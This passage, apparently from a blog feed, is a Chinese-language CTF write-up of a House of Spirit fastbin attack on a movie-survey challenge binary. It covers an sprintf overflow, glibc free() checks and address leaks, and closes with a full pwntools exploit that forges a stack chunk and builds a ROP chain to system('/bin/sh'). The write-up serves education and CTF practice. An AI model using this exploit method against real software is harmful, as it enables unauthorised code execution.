class="number">3u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( choice == <span class="string">'Y'</span> || choice == <span class="string">'y'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(buf);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( choice == <span class="string">'N'</span> || choice == <span class="string">'n'</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Wrong choice."</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">    <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次输入<code>name</code>, <code>age</code>, <code>reason</code>, <code>comment</code>然后会依次输出，并且会把字符串”%d comment so far. We will review them as soon as we can”放在v1里面，如果继续评论的话，<code>buf</code>会先<code>free</code>然后再重新<code>malloc</code>。</p><h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="House-of-spirit-攻击原理"><a href="#House-of-spirit-攻击原理" class="headerlink" title="House of spirit 攻击原理"></a>House of spirit 攻击原理</h2><p>House of spirit是fastbin attack中的一种，主要是free出一个目标地址的fastbin出来，然后再malloc从而达到任意地址写的目的。<br><br>需要绕过的一些检测：</p><ul><li><code>fake chunk</code>的<code>ISMMAP</code>位(size的第2个bit）不能为1，因为free时，如果是<code>mmap</code>的chunk，会单独处理。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>fake chunk</code>地址需要对齐<code>MALLOC_ALIGN_MASK</code>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -<span class="built_in">size</span>, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>fake chunk</code>的<code>size</code>大小需要满足对应的fastbin的需求，同时也得对齐。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">size</span> &lt; MINSIZE || !aligned_OK (<span class="built_in">size</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>fake chunk</code>的<code>next chunk</code>的大小不能小于<code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code>。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, <span class="built_in">size</span>)) &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">    of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">    after getting the lock.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock || </span><br><span class="line">        (&#123; </span><br><span class="line">            assert (locked == <span class="number">0</span>); </span><br><span class="line">            mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">1</span>;</span><br><span class="line">            chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ || chunksize (chunk_at_offset (p, <span class="built_in">size</span>)) &gt;= av-&gt;system_mem;</span><br><span class="line">        &#125;))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>fake chunk</code>对应的fastbin链表头部不能是该<code>fake chunk</code>，即不能构成double free的情况。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">    (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">    size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">    only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">    deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old;</span><br><span class="line">&#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure></li></ul><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul><li>乍一眼看过去好像没什么洞，发现问题出在<code>sprintf</code>中，<code>v1</code>分配的大小是0x38，当<code>cnt</code>是两位数的时候，字符串长度正好是0x38，导致<code>nbytes</code>被覆盖为0，那么只要cnt为三位数，就可以将<code>cnt</code>覆盖为<code>ord(&#39;n&#39;)=0x6e</code>：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v1; <span class="comment">// [sp+10h] [bp-E8h]@2</span></span><br><span class="line"><span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+48h] [bp-B0h]@1</span></span><br><span class="line"><span class="keyword">size_t</span> v3; <span class="comment">// [sp+4Ch] [bp-ACh]@1</span></span><br><span class="line"><span class="keyword">char</span> s; <span class="comment">// [sp+50h] [bp-A8h]@2</span></span><br><span class="line"><span class="keyword">int</span> v5; <span class="comment">// [sp+A0h] [bp-58h]@2</span></span><br><span class="line"><span class="keyword">void</span> *buf; <span class="comment">// [sp+A4h] [bp-54h]@2</span></span><br><span class="line"><span class="keyword">int</span> v7; <span class="comment">// [sp+A8h] [bp-50h]@2</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);</span><br></pre></td></tr></table></figure></li><li>那么对应的对<code>s</code>的输入可以溢出到<code>v5</code>和<code>buf</code>，这里可以将栈上的libc，stack以及heap address全部都leak出来：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;s, nbytes);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;s);</span><br></pre></td></tr></table></figure></li><li>地址leak出来之后，就可以在栈上<code>v7</code>的区域伪造出fake fastbin以及next chunk size，之后它会被<code>free</code>到fastbin中</li><li>下一次的malloc就能分配到栈上的地址空间，由于这个时候<code>nbytes=0x68</code>，并且这个fake chunk距离栈上的return address的offset只有0x4c，所以这里我采用的是写rop的方法，构造<code>system(&quot;/bin/sh&quot;);</code>，从而在从<code>survey</code>返回地时候触发来getshell。</li></ul><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">survey</span><span class="params">(name, age, reason, comment)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">""</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Please enter your name: "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please enter your age: "</span>, str(age))</span><br><span class="line">    p.sendafter(<span class="string">"Why did you came to see this movie? "</span>, reason)</span><br><span class="line">    <span class="keyword">if</span> comment != <span class="string">""</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Please enter your comment: "</span>, comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>, choice)</span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">heap_offset = <span class="number">0x410</span></span><br><span class="line">stack_offset = <span class="number">0x1eaf8</span></span><br><span class="line">stdout_offset = <span class="number">0x1b0d60</span></span><br><span class="line">ebp_offset = <span class="number">0x1ead8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make cnt to 100</span></span><br><span class="line"><span class="comment"># thus, overwrite the value of 'nbytes' to ord('n') </span></span><br><span class="line"><span class="comment"># because len("100 comment so far. We will review them as soon as we can") will be 57</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    survey(<span class="string">"AAAA"</span>, <span class="number">1</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">    keep(<span class="string">"y"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    survey(<span class="string">""</span>, <span class="number">1</span>, <span class="string">"AAAA"</span>, <span class="string">""</span>)</span><br><span class="line">    keep(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap, stack and libc address</span></span><br><span class="line">survey(<span class="string">"BBBB"</span>, <span class="number">1</span>, <span class="string">"B"</span> * <span class="number">0x4b</span> + <span class="string">"stack"</span>, <span class="string">"B"</span> * <span class="number">0x50</span> + <span class="string">"heap"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"heap"</span>)</span><br><span class="line">heap_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">heap_base = heap_addr - heap_offset</span><br><span class="line">p.recvuntil(<span class="string">"stack"</span>)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">stack_base = stack_addr - stack_offset</span><br><span class="line">stack_ebp = stack_base + ebp_offset</span><br><span class="line">libc_stdout = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</span><br><span class="line">libc_base = libc_stdout - stdout_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">keep(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake a fastbin near return address</span></span><br><span class="line"><span class="comment"># make sure the next chunk size can pass the check</span></span><br><span class="line"><span class="comment"># survey("CCCC", 1, p32(0) + p32(0x41) + "C" * 0x40 + p32(0) + p32(0x41), "C" * 0x54 + p32(stack_ebp - 0x40))</span></span><br><span class="line"><span class="comment"># keep("y")</span></span><br><span class="line">survey(<span class="string">"CCCC"</span>, <span class="number">1</span>, p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + <span class="string">"C"</span> * <span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>), <span class="string">"C"</span> * <span class="number">0x54</span> + p32(stack_ebp - <span class="number">0x48</span>))</span><br><span class="line">keep(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite return address to construct rop chain</span></span><br><span class="line">payload = <span class="string">"D"</span> * <span class="number">0x48</span></span><br><span class="line">payload += flat([<span class="number">0xdeadbeef</span>, libc_system, <span class="number">0xdeadbeef</span>, str_bin_sh])</span><br><span class="line">survey(payload, <span class="number">1</span>, <span class="string">"DDDD"</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">keep(<span class="string">"n"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">"stack_base: "</span> + hex(stack_base))</span><br><span class="line">success(<span class="string">"stack_ebp: "</span> + hex(stack_ebp))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>很基本的House of spirit attack，主要是了解一下原理以及一些check的pass</li><li>我能想到的最简单的就是rop了，不知道还有没有其他姿势</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>都是House of spirit的原理分析：</p><ol><li><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85357</a></li><li><a href="https://www.cnblogs.com/luoleqi/p/12357190.html" target="_blank" rel="noopener">https://www.cnblogs.com/luoleqi/p/12357190.html</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;House of spirit attack，题目名字说明了一切。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
